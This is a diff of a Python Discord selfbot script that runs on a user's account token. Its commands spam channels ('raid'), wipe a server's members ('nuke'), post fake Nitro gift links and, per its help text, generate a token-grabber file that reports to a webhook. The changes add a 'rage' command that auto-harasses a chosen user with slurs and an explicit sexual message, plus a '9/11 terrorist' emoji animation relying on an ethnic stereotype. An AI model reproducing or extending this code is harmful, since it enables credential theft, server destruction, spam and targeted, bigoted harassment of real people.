@@ -26,16 +26,16 @@ pip install aiohttp
 DISCLAIMER:
     
 Note that some commands here are made by astraa so credits to him <3
-
+Also this is kinda broken ngl
 """
 
 
 
 
-IPINFO_API_TOKEN = "api token here" # get it at ipinfo.io
+IPINFO_API_TOKEN = "..." # get it at ipinfo.io
 PREFIX = ">"
 #put yo token over here lol
-TOKEN = "ur account token here"
+TOKEN = "..."
 
 
 
@@ -102,6 +102,7 @@ async def chatspam(ctx, message: str, count: int, delay: float):
 
 @bot.command(aliases=["pornhubcomment", 'phc'])
 async def phcomment(ctx, user: str = None, *, args=None):
+        await ctx.message.add_reaction('✅')
         await ctx.message.delete()
         if user is None or args is None:
             await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}phcomment <message>')
@@ -124,6 +125,7 @@ async def phcomment(ctx, user: str = None, *, args=None):
 
 @bot.command(aliases=["copyguild", "copyserver"])
 async def copy(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     await bot.create_guild(f'backup-{ctx.guild.name}')
     await asyncio.sleep(4)
@@ -147,6 +149,7 @@ async def copy(ctx):
 
 @bot.command()
 async def exit(ctx):
+    await ctx.message.add_reaction('✅')
     print(f'Exiting python process, Logging out of {bot.user.name}')
     await ctx.send('```ini\n [exiting] ```')
     await bot.change_presence(activity=None)
@@ -154,6 +157,7 @@ async def exit(ctx):
 
 @bot.command()
 async def info(ctx, user: discord.User):
+    await ctx.message.add_reaction('✅')
     user_id = user.id
     username = user.name
     tag = user.discriminator
@@ -187,11 +191,13 @@ async def info(ctx, user: discord.User):
     
 @bot.command()
 async def geocode(ctx, latitude, longitude):
+    await ctx.message.add_reaction('✅')
     response = f"```diff\n- Address: ```https://maps.google.com/?q={latitude},{longitude}"
     await ctx.send(response)
 
 @bot.command()
 async def ping(ctx):
+    await ctx.message.add_reaction('✅')
     ping = round(bot.latency * 1000)
     response = f'Pong! {ping} MS'
     await ctx.send(response)
@@ -199,12 +205,14 @@ async def ping(ctx):
 
 @bot.command(aliases=["nitrogen"])
 async def nitro(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
     await ctx.send(f'https://discord.gift/{code}')
 
 @bot.command()
 async def iplookup(ctx, ip: str):
+    await ctx.message.add_reaction('✅')
     url = f"https://ipinfo.io/{ip}/json?token={IPINFO_API_TOKEN}"
     response = requests.get(url)
     
@@ -239,6 +247,7 @@ async def iplookup(ctx, ip: str):
 
 @bot.command()
 async def minesweeper(ctx, size: int=5):
+    await ctx.message.add_reaction('✅')
     #await ctx.message.delete()
     size = max(min(size, 8), 2)
     
@@ -271,6 +280,7 @@ async def minesweeper(ctx, size: int=5):
 
 @bot.command()
 async def hack(ctx, user: discord.Member=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     gender = ["Male", "Female", "Trans", "Other", "Retard"]
     age = str(random.randrange(10, 25))
@@ -363,6 +373,7 @@ async def hack(ctx, user: discord.Member=None):
 
 @bot.command(aliases=["renameserver", "nameserver"])
 async def servername(ctx, *, name=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     if name is None:
         await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}servername <name>')
@@ -372,16 +383,17 @@ async def servername(ctx, *, name=None):
 
 @bot.command()
 async def help(ctx):
+    await ctx.message.add_reaction('✅')
     message = await ctx.send("```ini\n[Welcome to Little Devil selfbot created by el diablo, please stand by]\n```")
-    
     await asyncio.sleep(1)  
     
-    new_message = "```ini\nCreated by diablo\n \n[>raid]: >raid <message> <numberoftimes> <delay put 0> <specify channel if not then it will spam in all> (dont forget to remove the <>)\n[>info]: >info <userid> or <username>\n[>ping]: Returns your MS\n[>geocode]: >geocode <latitude> <longitude> (must be integers)\n[>exit]: Exits out of the selfbot\n[>iplookup]: >iplookup <ip>\n[>nitro]: self explanatory, generates nitro \n[>minesweeper]: play a game of minesweeper :D\n[>filegrabber (webhook)]: >filegrabber (put webhook url) all this does is make a token grabber py file\n[>nuke]: This time it requires admin\n[>hack]: >hack (user) this time its a fun command\n[>guildicon]: >self explanatory\n[>servername]: <name>\n[>massreact (emoji)]: >massreact (select the emoji you wana react with)\n[>purge]: >purge (int)\n[>tableflip]: does the cool thing\n[>lenny]: another cool thing\n[>shrug]: ANOTHER COOL THING\n[>unflip]: wowww\n[>phcomment] >phcomment <username> <comment>\n[>rage]: >rage (userid) replies L to them everytime they say something in chat```"
+    new_message = f"```ini\nCreated by diablo | Version 17 | PREFIX = {PREFIX}\n \n[>raid]: >raid <message> <numberoftimes> <delay put 0> <specify channel if not then it will spam in all> (dont forget to remove the <>)\n[>info]: >info <userid> or <username>\n[>ping]: Returns your MS\n[>geocode]: >geocode <latitude> <longitude> (must be integers)\n[>exit]: Exits out of the selfbot\n[>iplookup]: >iplookup <ip>\n[>nitro]: self explanatory, generates nitro \n[>minesweeper]: play a game of minesweeper :D\n[>filegrabber (webhook)]: >filegrabber (put webhook url) all this does is make a token grabber py file\n[>nuke]: This time it requires admin\n[>hack]: >hack (user) this time its a fun command\n[>guildicon]: >self explanatory\n[>servername]: <name>\n[>massreact (emoji)]: >massreact (select the emoji you wana react with)\n[>purge]: >purge (int)\n[>tableflip]: does the cool thing\n[>lenny]: another cool thing\n[>shrug]: ANOTHER COOL THING\n[>unflip]: wowww\n[>phcomment] >phcomment <username> <comment>\n[>rage]: >rage (userid) replies L to them everytime they say something in chat\n[>911]: send a 911 animation with emojis```"
     await message.edit(content=new_message)
 
 
 @bot.command(aliases=["rekt", "nuke"])
 async def destroy(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     for user in list(ctx.guild.members):
         try:
@@ -416,6 +428,7 @@ async def destroy(ctx):
 
 @bot.command()
 async def massreact(ctx, emote=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     if emote is None:
         await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}massreact <emote>')
@@ -427,6 +440,7 @@ async def massreact(ctx, emote=None):
 
 @bot.command(aliases=["grabfile", "tokenfile"])
 async def filegrabber(ctx, webhook=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     if webhook is None:
         await ctx.send(f'[ERROR]: Invalid input! Command: {PREFIX}filegrabber <webhook>')
@@ -568,6 +582,7 @@ if __name__ == '__main__':
 
 @bot.command()
 async def shrug(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     shrug = r'¯\_(ツ)_/¯'
     await ctx.send(shrug)
@@ -575,6 +590,7 @@ async def shrug(ctx):
 
 @bot.command()
 async def lenny(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     lenny = '( ͡° ͜ʖ ͡°)'
     await ctx.send(lenny)
@@ -582,6 +598,7 @@ async def lenny(ctx):
 
 @bot.command(aliases=["fliptable"])
 async def tableflip(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     tableflip = '(╯°□°）╯︵ ┻━┻'
     await ctx.send(tableflip)
@@ -589,6 +606,7 @@ async def tableflip(ctx):
 
 @bot.command()
 async def unflip(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     unflip = '┬─┬ ノ( ゜-゜ノ)'
     await ctx.send(unflip)
@@ -596,6 +614,7 @@ async def unflip(ctx):
 
 @bot.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
 async def guildicon(ctx):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     if not ctx.guild.icon_url:
         await ctx.send(f"**{ctx.guild.name}** has no icon")
@@ -604,6 +623,7 @@ async def guildicon(ctx):
 
 @bot.command()
 async def purge(ctx, amount: int=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete()
     if amount is None:
         await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}purge <amount>')
@@ -616,10 +636,38 @@ async def purge(ctx, amount: int=None):
             pass
 
 
+@bot.command(aliases=["9/11", "911", "terrorist"])
+async def nine_eleven(ctx):
+    await ctx.message.add_reaction('✅')
+    await ctx.message.delete()
+    invis = ""  # char(173)
+    message = await ctx.send(f'''
+{invis}:man_wearing_turban::airplane:       :office:           
+''')
+    await asyncio.sleep(0.5)
+    await message.edit(content=f'''
+{invis} :man_wearing_turban: :airplane:     :office:           
+''')
+    await asyncio.sleep(0.5)
+    await message.edit(content=f'''
+{invis}  :man_wearing_turban:  :airplane:   :office:           
+''')
+    await asyncio.sleep(0.5)
+    await message.edit(content=f'''
+{invis}   :man_wearing_turban:   :airplane::office:           
+''')
+    await asyncio.sleep(0.5)
+    await asyncio.sleep(0.5)
+    await message.edit(content='''
+        :boom::boom::boom:    
+        ''')
 
 
-@bot.command()
+
+
+@bot.command(aliases=['halag'])
 async def rage(ctx, user_id: int):
+    await ctx.message.add_reaction('✅')
     try:
         user = await bot.fetch_user(user_id)
     except discord.NotFound:
@@ -630,8 +678,8 @@ async def rage(ctx, user_id: int):
     random_sentences = [
         "sorry but I never understand what you are actually trying to say",
         "your confidence to show up even with such disrespect is impressive",
-        "lmao nigga lives in his moms basement",
-        "keep yapping nigga",
+        "lmao this dude lives in his moms basement",
+        "keep yapping",
         "cry harder ong",
         "L",
         "skill issue mf",
@@ -639,12 +687,25 @@ async def rage(ctx, user_id: int):
         "proves my point that you're retarded",
         "the misinformation here is crazyy",
         "100000 blocked messages",
+        f"As he couldnt hold it anymore, he began ejaculating fully into {user.name}'s mouth making him swallow every bit of sweet n sour jizz coming out of his monster, FUCK..! he shouted as this was one of the best fucks ever..",
+        "Your family decided to become suicide bombers to get away from you",
+        "You are the definition of brain rot",
+        "You shop on TikTok shop",
+        "I bet you buy your food of Temu",
+        "When you think youre alone and everyone hates you, remember. We do all hate you",
+        "is retarded",
+        "You probably bought Twitter for $44 Billion instead of buying it off the App Store",
+        "I bet you call people brokies then go cry to your anime pillows about how hard your day was",
+        "You probably ate the purple pill.",
+        "Being an idiot is a choice, for you it was your only option."
     ]
     
     @bot.event
     async def on_message(message):
+        await ctx.message.add_reaction('✅')
         if message.author.id == user.id:
-            response = random.choice(random_sentences)  
+            response = random.choice(random_sentences) 
+            await asyncio.sleep(.5) #the delay here is optional comment it out if u want
             await message.channel.send(f'{user.mention} {response}')
     
     await ctx.send(f"{user.mention} lmaoo skill issue fr")
@@ -653,6 +714,7 @@ async def rage(ctx, user_id: int):
 
 @bot.command()
 async def raid(ctx, message: str, count: int, delay: float, channel: commands.TextChannelConverter=None):
+    await ctx.message.add_reaction('✅')
     await ctx.message.delete() 
 
     guild = ctx.guild
